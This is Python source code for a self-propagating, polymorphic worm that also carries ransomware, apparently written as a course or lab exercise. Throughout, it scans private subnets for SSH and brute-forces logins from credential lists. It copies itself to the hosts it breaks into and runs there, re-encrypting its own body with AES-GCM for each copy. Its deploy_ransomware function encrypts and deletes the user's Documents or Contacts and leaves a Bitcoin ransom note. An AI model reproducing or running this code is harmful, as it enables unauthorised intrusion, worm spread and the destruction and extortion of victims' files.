#!/usr/bin/env python3
"""
This worm does the following:
  - If the file is mutated (i.e. contains the AES‑GCM decryption wrapper),
    it decrypts and executes its worm body.
  - Otherwise, it scans for new target hosts (via SSH),
    infects them, and then self‑mutates so that a new unique copy is used
    for the next propagation cycle.
"""

import sys, os, base64, uuid, socket, re, subprocess, threading, traceback, logging
from datetime import datetime
from random import shuffle
import concurrent.futures

import netifaces
from netaddr import IPAddress, IPNetwork, AddrFormatError
import paramiko
from paramiko.ssh_exception import AuthenticationException, BadHostKeyException, SSHException

# --- Decryption Stub ---
def polymorphic_decrypt():
    """
    If the current file contains an encrypted worm body,
    decrypt it using the embedded AES-GCM wrapper and execute it.
    """
    current_file = sys.argv[0]
    with open(current_file, "r") as f:
        content = f.read()
    try:
        _, poly_body = content.split("# === ENCRYPTED BODY START ===\n", 1)
    except ValueError:
        # No encryption marker found; file is not mutated
        return
    # Execute the polymorphic wrapper
    exec(poly_body, globals())

# Check if the file has been mutated (i.e. contains the encryption marker)
with open(sys.argv[0], "r") as f:
    head = f.read(4096)
if "# === ENCRYPTED BODY START ===" in head:
    polymorphic_decrypt()

# === ENCRYPTED BODY START ===
# (This section is replaced by the AES-GCM decryption wrapper after mutation)
# === END WRAPPER ===

#################################
# Worm Body (Propagation Routine)
#################################

# Logging configuration with a custom colorized formatter
class ColorizedFormatter(logging.Formatter):
    grey = "\x1b[38;21m"
    yellow = "\x1b[33;21m"
    red = "\x1b[31;21m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    base_format = "%(asctime)s - %(message)s"
    FORMATS = {
        logging.DEBUG: grey + base_format + reset,
        logging.INFO: grey + base_format + reset,
        logging.WARNING: yellow + base_format + reset,
        logging.ERROR: red + base_format + reset,
        logging.CRITICAL: bold_red + base_format + reset
    }
    def format(self, record):
        fmt = self.FORMATS.get(record.levelno, self.base_format)
        return logging.Formatter(fmt).format(record)

logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(ColorizedFormatter())
logger.addHandler(console_handler)

file_handler = logging.FileHandler(filename=os.path.join(os.path.expanduser("~"), "dmsg.log"))
file_handler.setLevel(logging.DEBUG)
file_formatter = logging.Formatter('%(asctime)s - %(message)s')
file_handler.setFormatter(file_formatter)
logger.addHandler(file_handler)

# Worm configuration constants
HOME_DIR = os.path.expanduser("~")
REMOTE_DIR = "Temp"
INFECTED_LOG = "infected.log"
USERNAME_DICT = "username.txt"
PASSWORD_DICT = "password.txt"
ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
MIN_SUBNET_MASK = 24
propagation_threads = []

########################################
# Polymorphic Engine (AES-GCM Functions)
########################################

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def aes_encrypt_transform(text):
    """Encrypts text using AES-GCM and returns key, nonce, tag, and ciphertext."""
    key = os.urandom(32)            
    nonce = os.urandom(12)           
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(text.encode("utf-8")) + encryptor.finalize()
    tag = encryptor.tag
    return key, nonce, tag, ciphertext

def gen_aes_wrapper(worm_body):
    """Generates an AES-GCM decryption wrapper for the given worm body."""
    key, nonce, tag, ciphertext = aes_encrypt_transform(worm_body)
    key_b64 = base64.urlsafe_b64encode(key).decode("utf-8")
    nonce_b64 = base64.urlsafe_b64encode(nonce).decode("utf-8")
    tag_b64 = base64.urlsafe_b64encode(tag).decode("utf-8")
    ciphertext_b64 = base64.urlsafe_b64encode(ciphertext).decode("utf-8")
    wrapper = (
        "#!/usr/bin/env python3\n"
        "import base64, os\n"
        "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n"
        "from cryptography.hazmat.backends import default_backend\n"
        "\n"
        f"key = base64.urlsafe_b64decode('{key_b64}')\n"
        f"nonce = base64.urlsafe_b64decode('{nonce_b64}')\n"
        f"tag = base64.urlsafe_b64decode('{tag_b64}')\n"
        f"ciphertext = base64.urlsafe_b64decode('{ciphertext_b64}')\n"
        "\n"
        "cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())\n"
        "decryptor = cipher.decryptor()\n"
        "plaintext = decryptor.update(ciphertext) + decryptor.finalize()\n"
        "exec(plaintext, globals())\n"
    )
    return wrapper

def polymorph_file(file_path):
    """
    Replaces the worm body (after the encryption marker) with a new AES-GCM
    decryption wrapper, and renames the file to a unique name.
    """
    with open(file_path, "r") as f:
        content = f.read()
    try:
        header, body = content.split("# === ENCRYPTED BODY START ===\n", 1)
    except ValueError:
        logger.error("File does not contain the expected encryption marker.")
        sys.exit(1)
    salt = f"\n# MUTATION SALT: {uuid.uuid4().hex}\n"
    body += salt
    wrapper = gen_aes_wrapper(body)
    new_content = header + "# === ENCRYPTED BODY START ===\n" + wrapper
    with open(file_path, "w") as f:
        f.write(new_content)
    new_name = f"netvermin_{uuid.uuid4().hex[:8]}.py"
    os.rename(file_path, new_name)
    logger.error(f"Worm file mutated to {new_name}")
    return new_name

###############################################
# New Helper Functions for OS-Aware Propagation
###############################################

def detect_remote_os(ssh):
    """
    Detect the remote operating system.
    Tries to run 'uname -s' (works on Linux/Mac). If that fails,
    assumes the target is Windows.
    """
    try:
        _, stdout, _ = ssh.exec_command("uname -s")
        remote_os = stdout.read().decode().strip()
        if remote_os:
            logger.info(f"Detected remote OS via uname: {remote_os}")
            if "Linux" in remote_os or "Darwin" in remote_os:
                return "Linux"
    except Exception:
        pass  # If uname fails, assume Windows
    logger.info("Assuming remote OS is Windows")
    return "Windows"

def get_remote_home_dir(ssh):
    """
    Returns the home directory based on remote OS.
    """
    remote_os = detect_remote_os(ssh)
    try:
        if remote_os == "Linux":
            _, stdout, _ = ssh.exec_command("echo $HOME")
        else:
            # For Windows, execute the command to echo the USERPROFILE variable.
            _, stdout, _ = ssh.exec_command("echo %USERPROFILE%")
        home_dir = stdout.read().decode().strip()
        if home_dir:
            return home_dir
        else:
            raise ValueError("Empty home directory returned")
    except Exception as e:
        logger.error(f"Error retrieving remote home directory: {e}")
        # Fallback: for Linux use "~" (note this may not work with all SFTP clients)
        return "~" if remote_os == "Linux" else "%USERPROFILE%"

def remote_path_join(ssh, *parts):
    """
    Joins parts of a path using the appropriate separator for the remote OS.
    It determines the remote OS via detect_remote_os(ssh) and then uses
    '/' for Linux and '\\' for Windows.
    """
    remote_os = detect_remote_os(ssh)
    if remote_os == "Linux":
        return "/".join(parts)
    else:
        return "\\".join(parts)
    
def get_remote_exec_command(ssh, mutated_file):
    """
    Constructs the remote execution command for the mutated worm file
    based on the remote operating system.
    """
    remote_os = detect_remote_os(ssh)
    if remote_os == "Linux":
        # Use bash syntax (assumes python3 is installed)
        cmd = f"cd ~/{REMOTE_DIR} && python3 {mutated_file}"
    else:  # Windows
        # Use Windows command prompt syntax; /d allows changing drive letters
        cmd = f'cd /d "%USERPROFILE%\\{REMOTE_DIR}" && python {mutated_file}'
    return cmd

###########################################
# Worm Core (Network Propagation Functions)
###########################################

def initiate_worm():
    """Perform scanning, infection, and mutation propagation."""
    # If ransomware note doesn't exist, perform ransom operation.
    if not os.path.isfile(f"{HOME_DIR}/openme.txt"):
        deploy_ransomware()
    #Remove the debug log file if present -- uncomment if you want to examine each host's logs
    #if os.path.isfile("/tmp/dmsg.log"):
    #    os.remove("/tmp/dmsg.log")

    logger.info("Scanning local interfaces")
    local_ips, possible_subnets = local_addresses()
    logger.info("Scanning routes...")
    discovered_routes = routes()
    logger.info(f"Routes discovered: {discovered_routes}")
    for routed_subnet in discovered_routes:
        if routed_subnet not in possible_subnets:
            possible_subnets.append(routed_subnet)
    logger.info(f"Found {len(possible_subnets)} subnets.")
    shuffle(possible_subnets)
    permitted_subnets = filter_allowed(possible_subnets)
    logger.info(f"Permitted subnets: {permitted_subnets}")
    logger.info("Splitting subnets...")
    partitioned_subnets = partition_subnet(permitted_subnets)
    final_subnets = filter_allowed(partitioned_subnets)
    logger.info(f"Generated {len(final_subnets)} subnets: {final_subnets}")
    logger.info("Updating infected log...")
    update_infected_log(local_ips)
    logger.info("Scanning subnets for new targets...")
    
    infection_done = False
    for subnet in final_subnets:
        hosts = scan_network(subnet, local_ips)
        shuffle(hosts)
        logger.info(f"Discovered hosts: {hosts}")
        logger.info("Attempting SSH connection...")
        for host in hosts:
            if allowed(IPAddress(host)):
                #t = threading.Thread(target=connect_via_ssh, args=(host,))
                #t.start()
                #propagation_threads.append(t)
                connect_via_ssh(host)
                infection_done = True
                break
        if infection_done:
            break

    #for t in propagation_threads:
    #    t.join()

    if not infection_done:
        if os.environ.get("SELF_MUTATED", "0") == "0":
            os.environ["SELF_MUTATED"] = "1"
            logger.info("No new targets found. Self-mutating to ensure uniqueness.")
            self_mutate()
        else:
            logger.info("No new targets found and already self-mutated once. Terminating propagation.")
            sys.exit(0)

    #cleanup_local()

def deploy_ransomware():
    """Encrypt and delete documents, then leave an informative note."""
    note_path = os.path.join(HOME_DIR, "openme.txt")
    if os.path.exists(note_path):
        logger.info("Ransom note exists. Skipping ransomware action.")
        return
    
    if sys.platform.startswith("win"):
        docs_dir = os.path.join(HOME_DIR, "Contacts")
        if not os.path.exists(docs_dir):
            logger.info("Contacts directory not found. Skipping.")
            return

        zip_path = os.path.join(HOME_DIR, "Contacts.zip")
        try:
            subprocess.check_call(["powershell", "-Command",
                                   f"Compress-Archive -Path '{docs_dir}' -DestinationPath '{zip_path}'"])
            subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
            with open(note_path, "w") as f:
                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
            logger.error("Ransomware operation completed on this host (Windows).")
        except Exception as e:
            logger.error("Error during ransomware operation (Windows): " + str(e))
    else:
        docs_dir = os.path.join(HOME_DIR, "Documents")
        if not os.path.exists(docs_dir):
            logger.info("Documents directory not found. Skipping.")
            return

        tar_path = os.path.join(HOME_DIR, "Documents.tar")
        enc_path = os.path.join(HOME_DIR, "Documents.tar.enc")
        try:
            subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
            subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
                                     "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
            subprocess.check_call(["rm", "-rf", docs_dir])
            os.remove(tar_path)
            with open(note_path, "w") as f:
                f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
            logger.error("Ransomware operation completed on this host (Linux).")
        except Exception as e:
            logger.error("Error during ransomware operation (Linux): " + str(e))

def local_addresses():
    """Retrieve local IPv4 addresses and associated CIDR subnets."""
    interfaces = netifaces.interfaces()
    ip_list = []
    subnet_list = []
    for interface in interfaces:
        addrs = netifaces.ifaddresses(interface).get(netifaces.AF_INET)
        if addrs:
            for addr in addrs:
                logger.info(f"Interface found: {addr}")
                ip_list.append(IPAddress(addr['addr']))
                subnet_list.append(IPNetwork(addr['addr'] + "/" + addr['netmask']).cidr)
    return ip_list, subnet_list

def routes():
    if sys.platform.startswith("win"):
        try:
            routes_raw = subprocess.check_output(["route", "print", "-4"], shell=True).decode()
        except Exception as e:
            logger.error(f"Error running 'route print': {e}")
            return []
        discovered = []
        for route in routes_raw.splitlines():
            m = re.search(r"^\s*(\d+\.\d+\.\d+\.\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+", route)
            if m:
                try:
                    network = IPNetwork(f"{m.group(1)}/{m.group(2)}")
                    discovered.append(network)
                except AddrFormatError:
                    continue
        return discovered
    else:
        """Parse the system routing table to find network subnets."""
        try:
            routes_raw = subprocess.check_output(["ip", "route"]).decode()
        except Exception as e:
            logger.error(f"Error running 'ip route': {e}")
            return []
        discovered = []
        for route in routes_raw.splitlines():
            if route.split()[0] != 'default':
                try:
                    network = IPNetwork(route.split()[0])
                    discovered.append(network)
                except AddrFormatError:
                    continue
        return discovered

def partition_subnet(subnet_list):
    """Split subnets with a mask shorter than MIN_SUBNET_MASK into smaller subnets."""
    new_subnet_list = []
    for subnet in subnet_list:
        if subnet.prefixlen < MIN_SUBNET_MASK:
            generated_subnets = list(subnet.subnet(MIN_SUBNET_MASK))
            shuffle(generated_subnets)
            new_subnet_list.extend(generated_subnets)
        else:
            new_subnet_list.append(subnet)
    return new_subnet_list

def is_host_up(ip, port=22, timeout=0.5):
    """
    Attempts to open a TCP connection to the given IP and port.
    Returns True if the connection succeeds, False otherwise.
    """
    try:
        sock = socket.create_connection((ip, port), timeout=timeout)
        sock.close()
        return True
    except socket.error:
        return False

def scan_hosts(candidate_hosts, port=22, timeout=0.5, max_workers=50):
    """
    Scans a list of candidate host IP addresses concurrently using a thread pool.
    Returns a list of hosts for which a TCP connection to the specified port was successful.
    """
    discovered = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all connection attempts concurrently.
        futures = {executor.submit(is_host_up, host, port, timeout): host for host in candidate_hosts}
        for future in concurrent.futures.as_completed(futures):
            host = futures[future]
            try:
                if future.result():
                    discovered.append(host)
            except Exception as e:
                pass
    return discovered

def scan_network(subnet, local_address_list):
    """
    Scans the given subnet (an IPNetwork object) for active hosts that:
      - Are up (TCP connection on the given port succeeds)
      - Are not in the list of local addresses (local_address_list)
      - Are not already listed in the INFECTED_LOG.
    Returns a list of discovered host IP addresses (as strings).
    """
    attacked_ips = set(load_entries(INFECTED_LOG))
    hosts = [str(ip) for ip in subnet.iter_hosts()]
    local_str = set(str(ip) for ip in local_address_list)
    candidate_hosts = [host for host in hosts if host not in attacked_ips and host not in local_str]
    
    discovered_hosts = scan_hosts(candidate_hosts, port=22, timeout=0.5)
    return discovered_hosts

def allowed(address):
    """Check if an IP address is within allowed subnets and not blocked."""
    for blocked_subnet in BLOCKED_SUBNETS:
        if address in IPNetwork(blocked_subnet) or address == IPNetwork(blocked_subnet):
            return False
    for allowed_subnet in ALLOWED_SUBNETS:
        if address in IPNetwork(allowed_subnet) or address == IPNetwork(allowed_subnet):
            return True
    return False

def filter_allowed(address_list):
    """Return only addresses that belong to allowed subnets."""
    return [address for address in address_list if allowed(address)]

def update_infected_log(ip_list):
    """Update the infected log only with new IPs (as strings) that aren’t already logged."""
    current_ips = set()
    if os.path.exists(INFECTED_LOG):
        with open(INFECTED_LOG, "r") as f:
            for line in f:
                line = line.strip()
                try:
                    current_ips.add(str(IPAddress(line)))
                except Exception:
                    continue
    new_ips = [str(ip) for ip in ip_list if str(ip) not in current_ips]
    if new_ips:
        with open(INFECTED_LOG, "a") as f:
            timestamp = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
            f.write("+++Infected: " + timestamp + "+++\n")
            for ip in new_ips:
                f.write(ip + "\n")
            f.write("\n")

def connect_via_ssh(ip):
    """Attempt SSH login to a target IP using credential lists."""
    ssh = paramiko.SSHClient()
    user_list = load_entries(USERNAME_DICT)
    pass_list = load_entries(PASSWORD_DICT)
    shuffle(user_list)
    shuffle(pass_list)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in user_list:
        for passwd in pass_list:
            logger.info(f"Attempting SSH connection to {ip} with {user}:{passwd}")
            try:
                ssh.connect(ip, username=user, password=passwd,
                            timeout=3, auth_timeout=3, banner_timeout=3,
                            allow_agent=False, look_for_keys=False)
                logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
                spread(ssh)
                sys.exit(0)
                #return
            except (AuthenticationException, BadHostKeyException):
                logger.info("SSH authentication failed.")
            except (SSHException, EOFError) as e:
                logger.debug(f"SSH connection error on {ip}: {str(e)}")
            except Exception as e:
                logger.info(f"SSH connection error on {ip}: {str(e)}")
                return

def spread(ssh):
    """
    If the target is not already infected, mutate the worm,
    transfer it via SSH, and execute it remotely.
    """
    if check_remote_infection_marker(ssh):
        logger.error("Remote host already infected. Skipping infection...")
        return
    
    current_file = sys.argv[0]
    mutated_file = polymorph_file(current_file)
    
    logger.error(f"Transferring mutated worm {mutated_file} via SSH...")
    sftp = ssh.open_sftp()
    remote_home_dir = get_remote_home_dir(ssh)
    try:
        sftp.mkdir(remote_path_join(ssh, remote_home_dir, REMOTE_DIR))
    except IOError:
        pass
    base_dir = os.getcwd()
    for filename in os.listdir(base_dir):
        full_path = os.path.join(base_dir, filename)
        remote_path = remote_path_join(ssh, remote_home_dir, REMOTE_DIR, filename)
        if os.path.isfile(full_path):
            sftp.put(full_path, remote_path)
        else:
            try:
                sftp.mkdir(remote_path)
            except IOError:
                pass
            sftp.put_dir(full_path, remote_path)
    sftp.close()

    remote_cmd = get_remote_exec_command(ssh, mutated_file)
    logger.error("Remote worm deployed. Executing worm via SSH...")
    t = threading.Thread(target=exec_remote_command, args=(ssh, remote_cmd))
    t.start()

    # Flush logs and exit
    for handler in logger.handlers:
        handler.flush()
    sys.exit(0)

def self_mutate():
    """Self-mutates the worm by re-encrypting its worm body."""
    current_file = os.path.abspath(sys.argv[0])
    mutated_file = polymorph_file(current_file)
    mutated_file_path = os.path.join(os.path.dirname(current_file), mutated_file)
    os.chmod(mutated_file_path, 0o755)
    logger.info(f"Self-mutation complete. New worm file: {mutated_file_path}")
    
    # Replace the current process with the new mutated worm, passing the updated environment.
    for handler in logger.handlers:
        handler.flush()
    os.execv(mutated_file_path, sys.argv)

def check_remote_infection_marker(ssh):
    """Check if the target machine already has the worm installed."""
    sftp = ssh.open_sftp()
    try:
        sftp.chdir(remote_path_join(ssh, get_remote_home_dir(ssh), REMOTE_DIR))
    except IOError:
        return False
    sftp.close()
    return True

def cleanup_local():
    """Deletes all files in the directory containing the worm."""
    try:
        for file_name in os.listdir(os.path.join(HOME_DIR, REMOTE_DIR)):
            file_path = os.path.join(HOME_DIR, REMOTE_DIR, file_name)
            os.remove(file_path)
        os.rmdir(os.path.join(HOME_DIR, REMOTE_DIR))
        logger.info(f"Deleted directory: {os.path.join(HOME_DIR, REMOTE_DIR)}")
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")

def load_entries(filename):
    """Load credential or log entries from a file."""
    with open(filename) as f:
        entries = f.readlines()
    return [entry.strip() for entry in entries]

def exec_remote_command(ssh, command):
    """Execute a command on a remote host via SSH."""
    _, stdout, stderr = ssh.exec_command(command)
    logger.info("".join(stdout.readlines()))
    logger.info("".join(stderr.readlines()))

#########################################
# End Worm Core Functions
#########################################

if __name__ == "__main__":
    try:
        initiate_worm()
    except Exception as e:
        traceback.print_exc()
